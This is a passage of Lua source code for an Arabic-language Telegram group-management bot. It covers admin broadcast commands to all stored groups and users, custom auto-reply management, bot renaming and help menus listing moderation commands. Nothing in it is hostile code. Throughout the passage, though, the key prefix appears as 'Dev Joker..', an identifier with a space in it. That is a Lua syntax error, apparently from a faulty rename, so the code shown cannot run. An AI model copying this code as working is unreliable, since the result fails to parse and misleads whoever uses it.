Dev_Abs(v, 0, 1, '['..msg.content_.text_..']', 1, 'md')
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم اذاعة رسالتك بنجاح \n⌁︙‏الى ↫ ❨ "..#list.." ❩ مشترك \n ✓", 1, 'md')
DevAbs:del(Dev Joker.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     Source Joker     --
if text == "اذاعه" and msg.reply_to_message_id_ == 0 and is_leader(msg) or text == "↫ اذاعه عام ⌁" and msg.reply_to_message_id_ == 0 and is_leader(msg) then 
DevAbs:setex(Dev Joker.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙ارسل لي سواء ↫ ⤈ \n❨ ملصق • متحركه • صوره • رساله ❩ \n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
return false
end 
if DevAbs:get(Dev Joker.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevAbs:del(Dev Joker.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
list = DevAbs:smembers(Dev Joker..'bot:groups') 
if msg.content_.text_ then
for k,v in pairs(list) do 
Dev_Abs(v, 0, 1, '['..msg.content_.text_..']', 1, 'md')
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم اذاعة رسالتك بنجاح \n⌁︙‏في ↫ ❨ "..#list.." ❩ مجموعة \n ✓", 1, 'md')
DevAbs:del(Dev Joker.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     Source Joker     --
if text == "اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0 and is_leader(msg) or text == "↫ اذاعه عام بالتوجيه ⌁" and msg.reply_to_message_id_ == 0 and is_leader(msg) then 
DevAbs:setex(Dev Joker.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙ارسل الرساله الان لتوجيها \n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
return false
end 
if DevAbs:get(Dev Joker.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevAbs:del(Dev Joker.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
local list = DevAbs:smembers(Dev Joker..'bot:groups')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم اذاعة رسالتك بالتوجية \n⌁︙‏في ↫ ❨ "..#list.." ❩ مجموعة \n ✓", 1, 'md')
DevAbs:del(Dev Joker.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     Source Joker     --
if text == "اذاعه خاص بالتوجيه" and msg.reply_to_message_id_ == 0 and is_leader(msg) or text == "↫ اذاعه خاص بالتوجيه ⌁" and msg.reply_to_message_id_ == 0 and is_leader(msg) then 
DevAbs:setex(Dev Joker.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙ارسل الرساله الان لتوجيها \n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
return false
end 
if DevAbs:get(Dev Joker.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevAbs:del(Dev Joker.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
local list = DevAbs:smembers(Dev Joker..'bot:userss')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم اذاعة رسالتك بالتوجية \n⌁︙‏الى ↫ ❨ "..#list.." ❩ مشترك \n ✓", 1, 'md')
DevAbs:del(Dev Joker.."Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     Source Joker     --
text = msg.content_.text_
if msg.content_.text_ == 'حذف رد' and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) or msg.content_.text_ == 'مسح رد' and  is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
DevAbs:set(Dev Joker..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','del_repgp1')
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمة لحذفها " ,  1, "md")
return false
end
if msg.content_.text_ then
local content_text = DevAbs:get(Dev Joker..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_text == 'del_repgp1' then
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙الكلمة *('..msg.content_.text_..')* تم حذفها ',  1, "md")
DevAbs:del(Dev Joker..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
DevAbs:del(Dev Joker..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(Dev Joker..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(Dev Joker..'audio_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(Dev Joker..'photo_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(Dev Joker..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(Dev Joker..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(Dev Joker..'file_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(Dev Joker..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:srem(Dev Joker..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
return false
end
end
--     Source Joker     --
if msg.content_.text_ == 'اضف رد' and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
DevAbs:set(Dev Joker..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','set_repgp')
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمة الان " ,  1, "md")
return false    end
if msg.content_.text_ then
local content_DevAbs2 = DevAbs:get(Dev Joker..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_DevAbs2 == 'set_repgp' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌁︙ يمكنك اضافه الى النص ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
DevAbs:set(Dev Joker..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','save_repgp')
DevAbs:set(Dev Joker..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'',msg.content_.text_)
DevAbs:sadd(Dev Joker..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
DevAbs:set(Dev Joker..'delrep_owner'..msg.chat_id_..'',msg.content_.text_)
return false
end
end
text = msg.content_.text_
if msg.content_.text_ == 'حذف رد عام' and is_sudo(msg) or msg.content_.text_ == '↫ حذف رد عام ⌁' and is_sudo(msg) or msg.content_.text_ == 'مسح رد عام' and is_sudo(msg) then
DevAbs:set(Dev Joker.."add:repallt"..msg.sender_user_id_,'del_rep1')
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمة لحذفها " ,  1, "md")
return false
end
if msg.content_.text_ then
local content_text = DevAbs:get(Dev Joker.."add:repallt"..msg.sender_user_id_)
if content_text == 'del_rep1' then
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙الكلمة *('..msg.content_.text_..')* تم حذفها ',  1, "md")
DevAbs:del(Dev Joker.."add:repallt"..msg.sender_user_id_)
DevAbs:del(Dev Joker.."gif_repall"..msg.content_.text_)
DevAbs:del(Dev Joker.."voice_repall"..msg.content_.text_)
DevAbs:del(Dev Joker.."audio_repall"..msg.content_.text_)
DevAbs:del(Dev Joker.."photo_repall"..msg.content_.text_)
DevAbs:del(Dev Joker.."stecker_repall"..msg.content_.text_)
DevAbs:del(Dev Joker.."video_repall"..msg.content_.text_)
DevAbs:del(Dev Joker.."file_repall"..msg.content_.text_)
DevAbs:del(Dev Joker.."text_repall"..msg.content_.text_)
DevAbs:del(Dev Joker.."rep_sudo",msg.content_.text_)
return false
end
end
--     Source Joker     --
if msg.content_.text_ == 'اضف رد عام' and is_sudo(msg) or msg.content_.text_ == '↫ اضف رد عام ⌁' and is_sudo(msg) then
DevAbs:set(Dev Joker.."add:repallt"..msg.sender_user_id_,'set_rep')
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمة الان " ,  1, "md")
return false    end
if msg.content_.text_ then
local content_DevAbs2 = DevAbs:get(Dev Joker.."add:repallt"..msg.sender_user_id_)
if content_DevAbs2 == 'set_rep' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌁︙ يمكنك اضافه الى النص ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
DevAbs:set(Dev Joker.."add:repallt"..msg.sender_user_id_,'save_rep')
DevAbs:set(Dev Joker.."addreply2:"..msg.sender_user_id_, msg.content_.text_)
DevAbs:sadd(Dev Joker.."rep_sudo",msg.content_.text_)
DevAbs:set(Dev Joker.."delrep_sudo",msg.content_.text_)
return false 
end end
--     Source Joker     --
if msg.content_.text_ == 'الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) or msg.content_.text_ == 'ردود المدير' and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
local redod = DevAbs:smembers(Dev Joker..'rep_owner'..msg.chat_id_..'')
if #redod == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود مضافة" ,  1, "md")
else
msg_rep = '⌁︙ردود المدير ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
for k,v in pairs(redod) do
if DevAbs:get(Dev Joker.."gif_repgp"..v..msg.chat_id_) then
dp = 'متحركه 🎭'
elseif DevAbs:get(Dev Joker.."voice_repgp"..v..msg.chat_id_) then
dp = 'بصمه 🎙'
elseif DevAbs:get(Dev Joker.."stecker_repgp"..v..msg.chat_id_) then
dp = 'ملصق 🃏'
elseif DevAbs:get(Dev Joker.."text_repgp"..v..msg.chat_id_) then
dp = 'رساله ✉'
elseif DevAbs:get(Dev Joker.."photo_repgp"..v..msg.chat_id_) then
dp = 'صوره 🎇'
elseif DevAbs:get(Dev Joker.."video_repgp"..v..msg.chat_id_) then
dp = 'فيديو 📽'
elseif DevAbs:get(Dev Joker.."file_repgp"..v..msg.chat_id_) then
dp = 'ملف 📁'
elseif DevAbs:get(Dev Joker.."audio_repgp"..v..msg.chat_id_) then
dp = 'اغنيه 🎶'
end
msg_rep = msg_rep ..k..'⌯ (*'..v..'*) ↫ {*'..dp..'*}\n' 
end
Dev_Abs(msg.chat_id_, msg.id_, 1, msg_rep,1, 'md')
end
return false
end
--     Source Joker     --
if msg.content_.text_ == 'حذف الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) or msg.content_.text_ == 'مسح الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) or msg.content_.text_ == 'حذف ردود المدير' and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) or msg.content_.text_ == 'مسح ردود المدير' and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
local redod = DevAbs:smembers(Dev Joker..'rep_owner'..msg.chat_id_..'')
if #redod == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود مضافة" ,  1, "md")
else
for k,v in pairs(redod) do
DevAbs:del(Dev Joker..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
DevAbs:del(Dev Joker..'gif_repgp'..v..msg.chat_id_)
DevAbs:del(Dev Joker..'voice_repgp'..v..msg.chat_id_)
DevAbs:del(Dev Joker..'audio_repgp'..v..msg.chat_id_)
DevAbs:del(Dev Joker..'photo_repgp'..v..msg.chat_id_)
DevAbs:del(Dev Joker..'stecker_repgp'..v..msg.chat_id_)
DevAbs:del(Dev Joker..'video_repgp'..v..msg.chat_id_)
DevAbs:del(Dev Joker..'file_repgp'..v..msg.chat_id_)
DevAbs:del(Dev Joker..'text_repgp'..v..msg.chat_id_)
DevAbs:del(Dev Joker..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
end
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف ردود المدير\n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
return false
end
end
--     Source Joker     --
if  msg.content_.text_ == "ردود المطور" and is_sudo(msg) or msg.content_.text_ == "الردود العام" and is_sudo(msg) or msg.content_.text_ == "ردود العام" and is_sudo(msg) or msg.content_.text_ == "↫ الردود العام ⌁" and is_sudo(msg) then
local redod = DevAbs:smembers(Dev Joker.."rep_sudo")
if #redod == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود مضافة" ,  1, "md")
else
local i = 1
msg_rep = '⌁︙ردود المطور ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
for k,v in pairs(redod) do
if DevAbs:get(Dev Joker.."gif_repall"..v) then
dp = 'متحركه 🎭'
elseif DevAbs:get(Dev Joker.."voice_repall"..v) then
dp = 'بصمه 🎙'
elseif DevAbs:get(Dev Joker.."stecker_repall"..v) then
dp = 'ملصق 🃏'
elseif DevAbs:get(Dev Joker.."text_repall"..v) then
dp = 'رساله ✉'
elseif DevAbs:get(Dev Joker.."photo_repall"..v) then
dp = 'صوره 🎇'
elseif DevAbs:get(Dev Joker.."video_repall"..v) then
dp = 'فيديو 📽'
elseif DevAbs:get(Dev Joker.."file_repall"..v) then
dp = 'ملف 📁'
elseif DevAbs:get(Dev Joker.."audio_repall"..v) then
dp = 'اغنيه 🎶'
end
msg_rep = msg_rep ..k..'⌯ (*'..v..'*) ↫ {*'..dp..'*}\n' 
end
Dev_Abs(msg.chat_id_, msg.id_, 1, msg_rep,1, "md")
end
return false
end
--     Source Joker     --
if msg.content_.text_ == "حذف ردود المطور" and is_sudo(msg) or msg.content_.text_ == "حذف ردود العام" and is_sudo(msg) or msg.content_.text_ == "مسح ردود المطور" and is_sudo(msg) then
local redod = DevAbs:smembers(Dev Joker.."rep_sudo")
if #redod == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود مضافة" ,  1, "md")
else
for k,v in pairs(redod) do
DevAbs:del(Dev Joker.."add:repallt"..v)
DevAbs:del(Dev Joker.."gif_repall"..v)
DevAbs:del(Dev Joker.."voice_repall"..v)
DevAbs:del(Dev Joker.."audio_repall"..v)
DevAbs:del(Dev Joker.."photo_repall"..v)
DevAbs:del(Dev Joker.."stecker_repall"..v)
DevAbs:del(Dev Joker.."video_repall"..v)
DevAbs:del(Dev Joker.."file_repall"..v)
DevAbs:del(Dev Joker.."text_repall"..v)
DevAbs:del(Dev Joker.."rep_sudo",msg.content_.text_)
end
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف ردود المطور \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
return false
end
end 
end
--     Source Joker     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^تغيير اسم البوت$") or text and text:match("^وضع اسم البوت$") or text and text:match("^تغير اسم البوت$") then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙ارسل اسم البوت الان \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set('ABS_PROX:'..bot_id..'namebot'..msg.sender_user_id_..'', 'msg')
return false 
end
end
if text and text == 'حذف اسم البوت' or text == 'مسح اسم البوت' then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
DevAbs:del('ABS_PROX:'..bot_id..'name_bot')
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف اسم البوت \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
end end 
--     Source Joker     --
if text and text:match("^استعاده الاوامر$") and is_leader(msg) or text and text:match("^استعادة كلايش الاوامر$") and is_leader(msg) then
DevAbs:del(Dev Joker..'bot:help', text)
DevAbs:del(Dev Joker..'bot:help1', text)
DevAbs:del(Dev Joker..'bot:help2', text)
DevAbs:del(Dev Joker..'bot:help3', text) 
DevAbs:del(Dev Joker..'bot:help4', text)
DevAbs:del(Dev Joker..'bot:help5', text) 
DevAbs:del(Dev Joker..'bot:help6', text) 
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم استعادة الكلايش الاصليه" ,  1, "md") 
end
if text and text:match("^تعيين الاوامر$") and is_leader(msg) or text and text:match("^تعيين امر الاوامر$") and is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (الاوامر) الان " ,  1, "md")
DevAbs:set(Dev Joker..'bot:help0'..msg.sender_user_id_..'', 'msg')
return false end
if text and text:match("^(.*)$") then
local ABS_PROX =  DevAbs:get(Dev Joker..'bot:help0'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشة الجديده " ,  1, "md")
DevAbs:set(Dev Joker..'bot:help0'..msg.sender_user_id_..'', 'no')
DevAbs:set(Dev Joker..'bot:help', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^الاوامر$") or text and text:match("^اوامر$") or text and text:match("^مساعده$") then
local help = DevAbs:get(Dev Joker..'bot:help')
local text =  [[
⌁︙اهلا بك في قائمة الاوامر ↫ ⤈ 
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙م1 ↫ اوامر الحمايه
⌁︙م2 ↫ اوامر الادمنيه
⌁︙م3 ↫ اوامر المدراء
⌁︙م4 ↫ اوامر المنشئين
⌁︙م5 ↫ اوامر المطورين
⌁︙م6 ↫ اوامر الاعضاء
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/So_Victor)
]] 
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
if text and text:match("^تعيين امر م1$") and is_leader(msg) or text and text:match("^تعيين امر م١$") and is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م1) الان " ,  1, "md")
DevAbs:set(Dev Joker..'bot:help01'..msg.sender_user_id_..'', 'msg')
return false end
if text and text:match("^(.*)$") then
local ABS_PROX =  DevAbs:get(Dev Joker..'bot:help01'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشة الجديده " ,  1, "md")
DevAbs:set(Dev Joker..'bot:help01'..msg.sender_user_id_..'', 'no')
DevAbs:set(Dev Joker..'bot:help1', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م1$") or text and text:match("^م١$") or text and text:match("^اوامر1$") or text and text:match("^اوامر١$") then
local help = DevAbs:get(Dev Joker..'bot:help1')
local text =  [[
⌁︙اوامر حماية المجموعه ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙قفل • فتح ↫ الروابط
⌁︙قفل • فتح ↫ المعرف
⌁︙قفل • فتح ↫ البوتات
⌁︙قفل • فتح ↫ المتحركه
⌁︙قفل • فتح ↫ الملصقات
⌁︙قفل • فتح ↫ الملفات
⌁︙قفل • فتح ↫ الصور
⌁︙قفل • فتح ↫ الفيديو
⌁︙قفل • فتح ↫ الاونلاين
⌁︙قفل • فتح ↫ الدردشه
⌁︙قفل • فتح ↫ التوجيه
⌁︙قفل • فتح ↫ الاغاني
⌁︙قفل • فتح ↫ الصوت
⌁︙قفل • فتح ↫ الجهات
⌁︙قفل • فتح ↫ الماركداون
⌁︙قفل • فتح ↫ التكرار
⌁︙قفل • فتح ↫ الهاشتاك
⌁︙قفل • فتح ↫ التعديل
⌁︙قفل • فتح ↫ التثبيت
⌁︙قفل • فتح ↫ الاشعارات
⌁︙قفل • فتح ↫ الكلايش
⌁︙قفل • فتح ↫ الشبكات
⌁︙قفل • فتح ↫ المواقع
⌁︙قفل • فتح ↫ الفشار
⌁︙قفل • فتح ↫ الكفر
⌁︙قفل • فتح ↫ الطائفيه
⌁︙قفل • فتح ↫ الكل
⌁︙قفل • فتح ↫ العربيه
⌁︙قفل • فتح ↫ الانكليزيه
⌁︙قفل • فتح ↫ الفارسيه
⌁︙قفل • فتح ↫ التفليش
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙اوامر حمايه اخرى ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙قفل • فتح + الامر ↫ ⤈
⌁︙الفارسيه بالطرد
⌁︙البوتات بالطرد
⌁︙البوتات بالتقييد
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/So_Victor)
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
if text and text:match("^تعيين امر م2$") and is_leader(msg) or text and text:match("^تعيين امر م٢$") and is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م2) الان " ,  1, "md")
DevAbs:set(Dev Joker..'bot:help21'..msg.sender_user_id_..'', 'msg')
return false end
if text and text:match("^(.*)$") then
local ABS_PROX =  DevAbs:get(Dev Joker..'bot:help21'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشة الجديده " ,  1, "md")
DevAbs:set(Dev Joker..'bot:help21'..msg.sender_user_id_..'', 'no')
DevAbs:set(Dev Joker..'bot:help2', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م2$") or text and text:match("^م٢$") or text and text:match("^اوامر2$") or text and text:match("^اوامر٢$") then
local help = DevAbs:get(Dev Joker..'bot:help2')
local text =  [[
⌁︙اوامر الادمنيه ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙الاعدادت
⌁︙تاك للكل 
⌁︙ضع وصف
⌁︙ضع صوره
⌁︙حذف الرابط
⌁︙حذف المطايه
⌁︙كللهم + الكلمه
⌁︙كشف البوتات
⌁︙طرد البوتات
⌁︙تنظيف + العدد
⌁︙تنظيف الميديا
⌁︙تنظيف التعديل
⌁︙ضع • حذف ↫ ترحيب
⌁︙ضع • حذف ↫ قوانين
⌁︙اضف • حذف ↫ صلاحيه
⌁︙الصلاحيات • حذف الصلاحيات
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙ضع رابط
⌁︙ضع تكرار + العدد
⌁︙ضع التكرار بالطرد
⌁︙ضع التكرار بالحذف
⌁︙ضع عدد الاحرف + العدد
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙رفع مميز • تنزيل مميز
⌁︙المميزين • حذف المميزين
⌁︙كشف القيود • رفع القيود
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙حذف • مسح + بالرد
⌁︙منع + الكلمه
⌁︙الغاء منع + الكلمه
⌁︙قائمه المنع
⌁︙حذف قائمه المنع
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تفعيل • تعطيل ↫ الحظر
⌁︙تفعيل • تعطيل ↫ الكتم
⌁︙تفعيل • تعطيل ↫ الرابط
⌁︙تفعيل • تعطيل ↫ الالعاب
⌁︙تفعيل • تعطيل ↫ الترحيب
⌁︙تفعيل • تعطيل ↫ كشف الاعدادات
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙طرد المحذوفين
⌁︙طرد ↫ بالرد • بالمعرف • بالايدي
⌁︙كتم • الغاء كتم
⌁︙تقييد • الغاء تقيد
⌁︙حظر • الغاء حظر
⌁︙المكتومين • حذف المكتومين
⌁︙المقيدين • حذف المقيدين
⌁︙المحظورين • حذف المحظورين
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تقييد دقيقه + عدد الدقائق
⌁︙تقييد ساعه + عدد الساعات
⌁︙تقييد يوم + عدد الايام
⌁︙الغاء تقييد ↫ لالغاء التقييد بالوقت
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/So_Victor)
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
if text and text:match("^تعيين امر م3$") and is_leader(msg) or text and text:match("^تعيين امر م٣$") and is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م3) الان " ,  1, "md")
DevAbs:set(Dev Joker..'bot:help31'..msg.sender_user_id_..'', 'msg')
return false end
if text and text:match("^(.*)$") then
local ABS_PROX =  DevAbs:get(Dev Joker..'bot:help31'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشة الجديده " ,  1, "md")
DevAbs:set(Dev Joker..'bot:help31'..msg.sender_user_id_..'', 'no')
DevAbs:set(Dev Joker..'bot:help3', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
